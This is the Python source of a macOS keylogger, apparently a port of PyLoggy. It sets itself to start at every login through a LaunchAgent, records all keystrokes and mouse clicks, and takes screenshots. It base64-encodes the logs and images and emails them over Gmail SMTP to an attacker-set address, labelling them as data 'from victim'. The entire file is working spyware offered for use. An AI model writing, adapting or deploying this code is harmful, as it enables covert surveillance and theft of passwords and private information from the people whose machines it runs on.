#!/usr/bin/python
# -*- coding: utf-8 -*-

"""
macOS-native version of PyLoggy
"""

import sys
import os
import time
import random
import smtplib
import string
import base64
import subprocess
from pynput import mouse, keyboard
from threading import Thread

global t, start_time, pics_names, yourgmail, yourgmailpass, sendto, interval

t = ""
pics_names = []

# Note: You have to edit this part for the keylogger to work

#########Settings########

yourgmail = ""  # What is your gmail?
yourgmailpass = ""  # What is your gmail password
sendto = ""  # Where should I send the logs to? (any email address)
interval = 60  # Time to wait before sending data to email (in seconds)

########################

try:
    f = open('Logfile.txt', 'a')
    f.close()
except:
    f = open('Logfile.txt', 'w')
    f.close()


def add_to_startup():
    """
    This function creates a LaunchAgent to make the script run on startup.
    """
    fp = os.path.dirname(os.path.realpath(__file__))
    file_name = os.path.basename(sys.argv[0])
    new_file_path = os.path.join(fp, file_name)

    plist_content = f"""
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.pyloggy.startup</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>{new_file_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
"""
    launch_agent_dir = os.path.expanduser('~/Library/LaunchAgents')
    if not os.path.exists(launch_agent_dir):
        os.makedirs(launch_agent_dir)

    plist_path = os.path.join(launch_agent_dir, 'com.pyloggy.startup.plist')
    with open(plist_path, 'w') as f:
        f.write(plist_content)


def screenshot():
    global pics_names
    def generate_name():
        return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(7))
    name = str(generate_name())
    pics_names.append(name)
    subprocess.run(['screencapture', f'{name}.png'])


def mail_it(data, pics_names):
    data = base64.b64encode(data.encode()).decode()
    data = 'New data from victim(Base64 encoded)\n' + data
    server = smtplib.SMTP('smtp.gmail.com:587')
    server.starttls()
    server.login(yourgmail, yourgmailpass)
    server.sendmail(yourgmail, sendto, data)
    server.close()

    for pic in pics_names:
        with open(f'{pic}.png', 'rb') as f:
            img_data = f.read()
        img_data = base64.b64encode(img_data).decode()
        img_data = 'New pic data from victim(Base64 encoded)\n' + img_data
        server = smtplib.SMTP('smtp.gmail.com:587')
        server.starttls()
        server.login(yourgmail, yourgmailpass)
        server.sendmail(yourgmail, sendto, img_data)
        server.close()
        os.remove(f'{pic}.png')


def on_click(x, y, button, pressed):
    global t, start_time, pics_names
    if pressed:
        data = f'\n[{time.ctime().split(" "[3])}]'
        data += f'\n\tButton: {button}'
        data += f'\n\tClicked in (Position): ({x}, {y})'
        data += '\n===================='
        t += data

        if len(t) > 300:
            screenshot()

        if len(t) > 500:
            with open('Logfile.txt', 'a') as f:
                f.write(t)
            t = ''

        if int(time.time() - start_time) >= int(interval):
            mail_it(t, pics_names)
            start_time = time.time()
            t = ''


def on_press(key):
    global t, start_time
    try:
        data = f'\n[{time.ctime().split(" "[3])}]'
        data += f'\n\tKeyboard key: {key.char}'
        data += '\n===================='
    except AttributeError:
        data = f'\n[{time.ctime().split(" "[3])}]'
        data += f'\n\tSpecial key: {key}'
        data += '\n===================='
    t += data

    if len(t) > 500:
        with open('Logfile.txt', 'a') as f:
            f.write(t)
        t = ''

    if int(time.time() - start_time) >= int(interval):
        mail_it(t, pics_names)
        t = ''


if __name__ == '__main__':
    add_to_startup()
    start_time = time.time()

    mouse_listener = mouse.Listener(on_click=on_click)
    keyboard_listener = keyboard.Listener(on_press=on_press)

    mouse_listener.start()
    keyboard_listener.start()

    mouse_listener.join()
    keyboard_listener.join()
